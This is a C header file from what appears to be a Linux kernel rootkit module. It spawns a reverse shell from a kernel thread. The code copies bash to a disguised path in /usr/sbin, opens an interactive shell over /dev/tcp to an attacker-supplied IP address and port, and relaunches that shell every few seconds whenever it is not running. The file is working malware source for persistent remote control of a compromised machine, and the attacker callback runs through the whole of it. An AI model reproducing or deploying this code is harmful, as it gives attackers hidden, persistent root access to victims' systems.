#ifndef REVSHELL_H
#define REVSHELL_H

#define CHECK_INTERVAL 5          /* seconds between liveness checks   */

#ifndef MARKER
#define MARKER "sysdiag_sh"       /* normally defined in getdents.h    */
#endif

#define SHELL_COPY "/usr/sbin/" MARKER

struct task_struct *mon_it;
struct task_struct *task;

static int __shell(void *data)
{
    static char *envp[] = { "HOME=/", "TERM=xterm",
                            "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
    static char cmd[256];
    char *argv[] = { "/bin/bash", "-c", cmd, NULL };

    /* built once at thread start, from the insmod parameters */
    snprintf(cmd, sizeof(cmd),
             "[ -x " SHELL_COPY " ] || cp /bin/bash " SHELL_COPY "; "
             "exec " SHELL_COPY " -i >& /dev/tcp/%s/%d 0>&1",
             attacker_ip, attacker_port);

    while (!kthread_should_stop()) {
        bool alive = false;

        /* is a process named MARKER running? */
        rcu_read_lock();
        for_each_process(task) {
            if (strncmp(task->comm, MARKER, strlen(MARKER)) == 0) {
                alive = true;
                break;
            }
        }
        rcu_read_unlock();

        /* dead or never started -> (re)spawn; the command first
         * auto-installs the renamed bash copy, then execs it   */
        if (!alive)
            call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);

        ssleep(CHECK_INTERVAL);
    }

    return 0;
}

#endif